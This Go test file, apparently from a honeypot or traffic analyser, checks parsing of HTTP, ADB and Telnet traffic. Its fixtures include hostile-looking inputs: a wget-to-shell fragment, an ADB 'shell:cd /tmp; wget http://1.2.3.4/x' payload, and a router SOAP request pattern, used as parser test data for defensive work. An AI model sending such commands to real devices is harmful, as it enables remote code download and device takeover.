package parser

import (
	"bytes"
	"encoding/binary"
	"strings"
	"testing"
)

func TestDetect(t *testing.T) {
	adb := BuildADB("CNXN", 0x01000000, 4096, []byte("host::\x00"))
	cases := []struct {
		name string
		in   []byte
		want Protocol
	}{
		{"http get", []byte("GET / HTTP/1.1\r\n"), HTTP},
		{"http post", []byte("POST /UD/act?1 HTTP/1.1\r\n"), HTTP},
		{"adb", adb, ADB},
		{"adb partial", []byte("CNXN"), ADB},
		{"telnet iac", []byte{0xff, 0xfd, 0x18}, Telnet},
		{"random", []byte("hello"), Raw},
		{"fake adb magic", append([]byte("CNXN"), make([]byte, 30)...), Raw},
	}
	for _, c := range cases {
		if got := Detect(c.in); got != c.want {
			t.Errorf("%s: got %s want %s", c.name, got, c.want)
		}
	}
}

func TestParseHTTPWithBody(t *testing.T) {
	body := `<?xml version="1.0"?><soap:Envelope></soap:Envelope>`
	raw := "POST /UD/act?1 HTTP/1.1\r\nHost: x\r\nUser-Agent: Hello-World\r\nContent-Length: " +
		itoa(len(body)) + "\r\nSOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers\r\n\r\n" + body

	if _, _, st := ParseHTTPRequest([]byte(raw[:len(raw)-5]), false); st != NeedMore {
		t.Fatalf("want NeedMore, got %v", st)
	}
	req, n, st := ParseHTTPRequest([]byte(raw), false)
	if st != Done || n != len(raw) {
		t.Fatalf("status=%v consumed=%d", st, n)
	}
	if req.Method != "POST" || req.Target != "/UD/act?1" || req.UserAgent != "Hello-World" {
		t.Fatalf("bad parse: %+v", req)
	}
	if string(req.Body) != body {
		t.Fatalf("bad body %q", req.Body)
	}

	req, _, st = ParseHTTPRequest([]byte(raw[:len(raw)-5]), true)
	if st != Done || len(req.Body) != len(body)-5 {
		t.Fatalf("final mode: st=%v body=%d", st, len(req.Body))
	}
}

func TestParseHTTPInvalidAndPipelined(t *testing.T) {
	if _, _, st := ParseHTTPRequest([]byte("\x00\x01\x02\r\n\r\n"), false); st != Invalid {
		t.Fatalf("binary junk must be Invalid, got %v", st)
	}
	two := "GET /a HTTP/1.1\r\nHost: h\r\n\r\nGET /b HTTP/1.1\r\nHost: h\r\n\r\n"
	r1, n, st := ParseHTTPRequest([]byte(two), false)
	if st != Done || r1.Target != "/a" {
		t.Fatal("first request")
	}
	r2, _, st := ParseHTTPRequest([]byte(two[n:]), false)
	if st != Done || r2.Target != "/b" {
		t.Fatal("second request")
	}
}

func TestLeftoverBytesAreNotARequest(t *testing.T) {
	for _, junk := range []string{"9/a.sh -O- | sh)", "wget http://x/y", "hello world", "\x00\x01 abc"} {
		if _, _, st := ParseHTTPRequest([]byte(junk), true); st != Invalid {
			t.Errorf("%q parsed as a request (status %v)", junk, st)
		}
	}
	if _, _, st := ParseHTTPRequest([]byte("M-SEARCH * HTTP/1.1\r\nHost: x\r\n\r\n"), false); st != Done {
		t.Error("M-SEARCH must still parse")
	}
}

func TestADBRoundTrip(t *testing.T) {
	a := BuildADB("OPEN", 7, 0, []byte("shell:cd /tmp; wget http://1.2.3.4/x\x00"))
	b := BuildADB("CNXN", 1, 2, []byte("host::"))
	stream := append(append([]byte{}, a...), b...)

	cut := len(a) + 10
	msgs, used, err := ParseADB(stream[:cut], 4096)
	if err != nil || len(msgs) != 1 || used != len(a) {
		t.Fatalf("chunk1: msgs=%d used=%d err=%v", len(msgs), used, err)
	}
	if msgs[0].Command != "OPEN" || !strings.HasPrefix(string(msgs[0].Payload), "shell:cd /tmp") {
		t.Fatalf("bad message %+v", msgs[0])
	}
	msgs, _, err = ParseADB(stream[used:], 4096)
	if err != nil || len(msgs) != 1 || msgs[0].Command != "CNXN" {
		t.Fatalf("chunk2: %v %v", msgs, err)
	}
}

func TestADBRejectsOversizeAndBadMagic(t *testing.T) {
	big := BuildADB("WRTE", 1, 1, make([]byte, 100))
	if _, _, err := ParseADB(big, 50); err == nil {
		t.Fatal("oversize payload must be rejected")
	}
	bad := BuildADB("OPEN", 1, 1, nil)
	bad[20] ^= 0xff
	if _, _, err := ParseADB(bad, 50); err == nil {
		t.Fatal("bad magic must be rejected")
	}
}

func TestStripTelnet(t *testing.T) {
	in := []byte{0xff, 0xfd, 0x18, 'r', 'o', 'o', 't', 0xff, 0xfa, 0x18, 0x00, 'x', 0xff, 0xf0, '\r', '\n', 0xff, 0xff}
	got := StripTelnet(in)
	want := append([]byte("root\r\n"), 0xff)
	if !bytes.Equal(got, want) {
		t.Fatalf("got %q want %q", got, want)
	}
}

func TestSanitizeAndTruncate(t *testing.T) {
	got := Sanitize([]byte("a\x00b\x1b[31m\nok\xff"), 100)
	if strings.ContainsAny(got, "\x00\x1b\xff") || !strings.Contains(got, "\nok") {
		t.Fatalf("bad sanitize: %q", got)
	}
	if s := Truncate("héllo", 2); s != "h" {
		t.Fatalf("rune boundary cut failed: %q", s)
	}
}

func itoa(n int) string {
	var sb strings.Builder
	if n == 0 {
		return "0"
	}
	var d []byte
	for n > 0 {
		d = append([]byte{byte('0' + n%10)}, d...)
		n /= 10
	}
	sb.Write(d)
	return sb.String()
}

func TestADBCommandsGivenAsHexConstants(t *testing.T) {
	const (
		cmdCNXN = 0x4e584e43
		cmdOPEN = 0x4e45504f
		cmdWRTE = 0x45545257
		cmdCLSE = 0x45534c43
		version = 0x01000000
		maxdata = 4096
	)
	pkt := func(cmd, a0, a1 uint32, data []byte) []byte {
		h := make([]byte, 24, 24+len(data))
		binary.LittleEndian.PutUint32(h[0:], cmd)
		binary.LittleEndian.PutUint32(h[4:], a0)
		binary.LittleEndian.PutUint32(h[8:], a1)
		binary.LittleEndian.PutUint32(h[12:], uint32(len(data)))
		var sum uint32
		for _, b := range data {
			sum += uint32(b)
		}
		binary.LittleEndian.PutUint32(h[16:], sum)
		binary.LittleEndian.PutUint32(h[20:], ^cmd)
		return append(h, data...)
	}
	stream := append(pkt(cmdCNXN, version, maxdata, []byte("host::\x00")), pkt(cmdOPEN, 1, 0, []byte("shell:id\x00"))...)
	stream = append(stream, pkt(cmdWRTE, 1, 2, []byte("ls\n"))...)
	stream = append(stream, pkt(cmdCLSE, 1, 2, nil)...)

	if Detect(stream) != ADB {
		t.Fatalf("not detected as ADB: %v", Detect(stream))
	}
	msgs, used, err := ParseADB(stream, 1<<20)
	if err != nil || used != len(stream) || len(msgs) != 4 {
		t.Fatalf("parse: n=%d used=%d/%d err=%v", len(msgs), used, len(stream), err)
	}
	for i, want := range []string{"CNXN", "OPEN", "WRTE", "CLSE"} {
		if msgs[i].Command != want {
			t.Errorf("message %d = %q, want %q", i, msgs[i].Command, want)
		}
	}
	if msgs[0].Arg0 != version || msgs[0].Arg1 != maxdata {
		t.Errorf("CNXN args = %#x/%d", msgs[0].Arg0, msgs[0].Arg1)
	}

	bad := pkt(cmdCNXN, version, maxdata, nil)
	binary.LittleEndian.PutUint32(bad[20:], 0)
	if Detect(bad) == ADB {
		t.Error("header with a bad magic word was accepted as ADB")
	}
}
